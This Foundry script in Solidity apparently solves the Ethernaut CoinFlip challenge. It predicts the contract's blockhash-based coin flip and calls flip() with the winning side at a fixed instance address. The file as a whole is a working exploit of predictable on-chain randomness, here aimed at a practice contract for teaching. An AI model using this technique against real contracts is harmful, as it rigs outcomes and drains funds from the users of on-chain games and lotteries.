// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel03.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract POC is Script {
    using SafeMath for uint256;

    CoinFlip level3 = CoinFlip(0xa7604317Ebe188501578474781f18e8750d6FD3E);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }
            
        console.log("Consecutive Wins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }
}